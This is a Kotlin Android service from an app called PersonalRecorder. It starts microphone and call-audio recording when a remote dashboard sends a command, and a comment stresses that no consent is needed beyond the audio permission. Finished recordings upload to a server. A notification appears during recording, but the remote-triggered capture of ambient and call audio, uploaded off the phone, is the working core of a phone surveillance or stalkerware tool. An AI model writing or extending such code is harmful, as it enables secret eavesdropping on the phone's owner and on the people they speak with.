package com.example.personalrecorder.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import androidx.core.content.ContextCompat
import com.example.personalrecorder.R
import com.example.personalrecorder.net.MediaUploader
import com.example.personalrecorder.net.RealtimeClient
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.jvm.Volatile

/**
 * Surrounding (ambient) audio recording on demand.
 *
 * Controlled from the UI toggle, or remotely with
 * {"type":"mic_start"} / {"type":"mic_stop"}.
 *
 * This is also the "audio call recording" path: {"type":"call_audio_start"}
 * starts the same mic recording tagged as a call, so it lands in the
 * dashboard's "Audio calls" section. It captures the user's side of any call
 * (WhatsApp, Instagram, ...) exactly like a voice recorder app.
 *
 * Note: it cannot capture the far end of a call on a stock, non-rooted
 * Android — the OS grants exclusive mic access to the in-call app and
 * restricts call/audio-capture APIs (see the README "Limits" section).
 */
class AudioRecorderService : Service() {

    companion object {
        const val ACTION_STOP = "action_stop"
        const val EXTRA_CATEGORY = "category"
        const val CHANNEL_ID = "audio_channel"
        private const val NOTIFICATION_ID = 1002

        /** Category tag for call recordings (dashboard "Audio calls" section). */
        const val CATEGORY_CALL_AUDIO = "call_audio"

        @Volatile
        var isRunning = false
            private set

        /**
         * Remote "call_audio_start" handler (registered by ConnectionService,
         * which is long-lived). No consent needed beyond the RECORD_AUDIO
         * permission, so the service can be started from a cold state.
         */
        fun onRemoteCallAudioStart(context: Context) {
            if (isRunning) return
            ContextCompat.startForegroundService(
                context,
                Intent(context, AudioRecorderService::class.java)
                    .putExtra(EXTRA_CATEGORY, CATEGORY_CALL_AUDIO)
            )
        }

        /** Remote "call_audio_stop" handler. */
        fun onRemoteCallAudioStop(context: Context) {
            if (!isRunning) return
            context.startService(
                Intent(context, AudioRecorderService::class.java).setAction(ACTION_STOP)
            )
        }

        /**
         * Remote "mic_start" handler (registered by ConnectionService, which
         * is long-lived). No consent needed beyond the RECORD_AUDIO
         * permission, so the service can be started from a cold state.
         */
        fun onRemoteStart(context: Context) {
            if (isRunning) return
            ContextCompat.startForegroundService(
                context,
                Intent(context, AudioRecorderService::class.java)
            )
        }

        /** Remote "mic_stop" handler. */
        fun onRemoteStop(context: Context) {
            if (!isRunning) return
            context.startService(
                Intent(context, AudioRecorderService::class.java).setAction(ACTION_STOP)
            )
        }
    }

    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var currentCategory: String = "audio"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        // Command handlers are registered centrally by ConnectionService.
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // A second start while already recording must NOT stop the recording
        // (the old `|| isRunning` branch made a duplicate mic_start kill the
        // active capture). Only an explicit ACTION_STOP stops.
        if (intent?.action == ACTION_STOP) {
            stopRecording()
            return START_NOT_STICKY
        }
        if (isRunning) return START_NOT_STICKY
        currentCategory = intent?.getStringExtra(EXTRA_CATEGORY) ?: "audio"
        startRecording()
        return START_STICKY
    }

    private fun startRecording() {
        if (isRunning) return
        try {
            startInForeground()
            val dir = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "audio")
                .apply { mkdirs() }
            currentFile = File(dir, "audio_${timestamp()}.m4a")
            val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
            r.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128_000)
                setAudioSamplingRate(44_100)
                setOutputFile(currentFile!!.absolutePath)
                prepare()
                start()
            }
            recorder = r
            isRunning = true
            RealtimeClient.send(
                "audio_started",
                JSONObject().put("path", currentFile!!.absolutePath).put("category", currentCategory)
            )
        } catch (e: Exception) {
            // Mic may be in use by another app (e.g. a call) or permission missing.
            // Report it so the dashboard shows why nothing was recorded.
            isRunning = false
            stopForeground(STOP_FOREGROUND_REMOVE)
            RealtimeClient.send(
                "mic_error",
                JSONObject().put("reason", e.message ?: "start_failed")
            )
        }
    }

    private fun stopRecording() {
        val r = recorder ?: return
        try {
            r.stop()
        } catch (_: Exception) {
            // recording was too short / had no input
        }
        try {
            r.release()
        } catch (_: Exception) {}
        recorder = null
        isRunning = false
        val finished = currentFile
        RealtimeClient.send("audio_stopped", JSONObject().put("path", finished?.absolutePath ?: ""))
        finished?.let { MediaUploader.upload(it, "audio", currentCategory) }
        currentFile = null
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun startInForeground() {
        val stopIntent = PendingIntent.getService(
            this, 0,
            Intent(this, AudioRecorderService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_IMMUTABLE
        )
        val notification = Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("Recording ambient audio")
            .setContentText("PersonalRecorder is recording the microphone")
            .addAction(Notification.Action.Builder(null, "Stop", stopIntent).build())
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Audio recording", NotificationManager.IMPORTANCE_LOW
        )
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun timestamp(): String =
        SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
}
